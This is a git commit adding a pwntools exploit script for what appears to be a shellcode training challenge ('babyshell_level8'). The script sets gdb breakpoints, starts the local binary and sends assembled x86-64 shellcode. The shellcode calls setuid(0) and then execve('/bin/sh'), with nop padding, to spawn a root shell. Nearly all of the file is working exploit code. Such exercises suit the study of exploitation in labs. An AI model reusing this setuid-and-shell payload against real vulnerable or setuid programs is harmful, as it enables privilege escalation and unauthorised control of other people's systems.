8102902f0d7474442ddeccf4ad98ea4a364a3f70
Chris Buckner <chrisbuckner@Chriss-MBP.lan>
2021-09-14 22:29:59 -0400

    shellcode basics

---
+++ shellcode101/level8_testing1.py
@@ -0,0 +1,79 @@
+from pwn import *
+
+pwnable = './babyshell_level8_testing1'
+
+elf = ELF(pwnable)
+
+context(terminal=['tmux', 'new-window'])
+
+context.log_level = 'DEBUG'
+context(os = 'linux', arch = 'amd64')
+
+debug_set_1 = '''
+    b main
+    b *0x5555555555af
+    b *0x5555555554fa
+    #b *0x5555555554c8
+    '''
+    #b *0x5555555555af
+    #b *0x5555555554c8
+
+if len(sys.argv) > 2 and sys.argv[1] == 'debug':
+    #p = process(pwnable)
+    #gdb.attach(p, debug_set_1)
+    p = gdb.debug(pwnable, debug_set_1)
+else:
+    p = process(pwnable)
+    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
+    p = process(pwnable, debug_set_1)
+
+shellcode_2 = '''
+
+push 0
+pop rdi
+push 105
+pop rax
+syscall 
+
+
+mov rax, 59     
+lea rdi, [rip+binsh]    
+mov rsi, 0      
+mov rdx, 0  
+syscall         
+binsh:
+.string "/bin/sh"
+'''
+
+shellcode_3 = '''
+
+push 0
+pop rdi
+push 105
+pop rax
+nop
+nop
+syscall
+
+
+mov rax, 59
+nop
+nop
+nop
+nop
+nop
+lea rdi, [rip+binsh]
+mov rsi, 0
+mov rdx, 0
+syscall
+binsh:
+.string "/bin/sh"
+'''
+
+shellcode = asm(shellcode_3)
+
+p.recvuntil("0x1337000.\n")
+p.send(shellcode)
+#p.send(shellcode)
+#p.recvuntil("Segmentation fault")
+p.wait_for_close()
